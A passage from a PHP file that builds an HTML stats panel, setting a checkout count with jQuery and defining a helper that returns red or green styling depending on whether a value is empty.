				$('#stat_b   .checkouts').html('".$stat_b_checkout."');
				
				
			</script>
			
			<div id='report'></div>
		";
		
		
		$html .= "</div>";
		return $html;
		
	
	
}


function observer_not_empty($check){
	if($check == ''){
		return "background:#811313; color:#FFF;";
	} else {
		return "background:#13811e; color:#FFF;";
	}
}







